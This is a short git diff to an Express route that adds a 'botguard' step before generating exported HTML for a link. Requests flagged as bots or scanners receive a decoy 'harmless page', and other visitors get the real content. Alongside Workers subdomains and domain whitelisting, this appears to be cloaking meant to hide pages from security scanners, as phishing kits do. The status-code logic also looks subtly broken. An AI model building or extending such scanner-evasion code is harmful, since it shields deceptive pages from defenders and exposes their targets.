@@ -4,6 +4,7 @@ const jwt = require('jsonwebtoken');
 const db = require('../database/connection');
 const config = require('../config/env');
 const { userAuth } = require('../middleware/auth');
+const { classifyRequest, getHarmlessPage } = require('../middleware/botguard');
 const { validateResult, commonValidators } = require('../middleware/validator');
 
 // cf_workers_subdomain is stored as the PREFIX only ("powerballranger"), never
@@ -594,7 +595,17 @@ router.get('/:id/export', async (req, res) => {
     }
 
     const apiBaseUrl = `${req.protocol}://${req.get('host')}`;
-    const html = await templateLoader.generateExportHtml(link, user, { domain: exportDomain, apiBaseUrl });
+    const classification = await classifyRequest(req);
+    if (classification.action !== 'allow') {
+      const { contentType, body } = getHarmlessPage(classification.reason === 'Scanner path pattern' ? 404 : 200);
+      res.set({
+        'Content-Type': 'text/html; charset=utf-8',
+        'X-Content-Type-Options': 'nosniff',
+        'Cache-Control': 'no-store',
+      });
+      return res.status(contentType.includes('404') ? 404 : 200).send(body);
+    }
+    const html = await templateLoader.generateExportHtml(link, user, { domain: exportDomain, apiBaseUrl, req });
 
     // Include whitelist info in response headers for client-side tracking
     const whitelistDomains = [];
